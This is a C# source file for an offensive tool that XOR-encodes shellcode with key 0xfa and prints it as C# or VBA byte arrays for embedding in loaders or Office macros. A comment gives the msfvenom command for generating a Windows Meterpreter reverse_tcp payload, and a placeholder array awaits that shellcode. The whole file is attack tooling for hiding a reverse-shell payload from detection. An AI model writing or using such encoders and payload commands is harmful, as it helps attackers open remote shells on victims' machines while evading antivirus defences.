using System;
using System.IO;
using System.Text;

namespace PayloadXorEncoder
{
    public class Encoder
    {
        public static void Main(string[] arguments)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= IP LPORT= PORT EXITFUNC=thread -f csharp
            //change 0 value in [0] to number returned by msfvenom
            byte[] payload = new byte[0] {/*PLACEHOLDER PASTE MSFVENOM SHELLCODE HERE */};

            // XOR Encoding
            byte[] xorEncodedPayload = new byte[payload.Length];
            for (int index = 0; index < payload.Length; index++)
            {
                // XOR Key 0xfa
                xorEncodedPayload[index] = (byte)((uint)payload[index] ^ 0xfa);
            }

            StringBuilder payloadBuilder;

            if (arguments.Length > 0)
            {
                switch (arguments[0])
                {
                    case "-VBA":
                        // Generate VBA-compatible payload
                        uint vbaCounter = 0;

                        payloadBuilder = new StringBuilder(xorEncodedPayload.Length * 2);
                        foreach (byte item in xorEncodedPayload)
                        {
                            payloadBuilder.AppendFormat("{0:D3}, ", item);
                            vbaCounter++;
                            if (vbaCounter % 25 == 0)
                            {
                                payloadBuilder.Append("_\n");
                            }
                        }
                        Console.WriteLine($"XORed VBA Payload (key: 0xfa):");
                        Console.WriteLine(payloadBuilder.ToString());
                        break;
                    default:
                        Console.WriteLine("Supported arguments: -VBA to print VBA-compatible payload.");
                        break;
                }
            }
            else
            {
                // Generate C# compatible payload
                payloadBuilder = new StringBuilder(xorEncodedPayload.Length * 2);
                int payloadSize = xorEncodedPayload.Length;
                for (int pos = 0; pos < payloadSize; pos++)
                {
                    byte encodedByte = xorEncodedPayload[pos];

                    if ((pos + 1) == payloadSize) // Don't append a comma for the last item
                    {
                        payloadBuilder.AppendFormat("0x{0:x2}", encodedByte);
                    }
                    else
                    {
                        payloadBuilder.AppendFormat("0x{0:x2}, ", encodedByte);
                    }

                    if ((pos + 1) % 15 == 0)
                    {
                        payloadBuilder.Append("\n");
                    }
                }

                Console.WriteLine($"XORed C# Payload (key: 0xfa):");
                Console.WriteLine($"byte[] encodedPayload = new byte[{payload.Length}] {{\n{payloadBuilder}\n}};");
            }
        }
    }
}
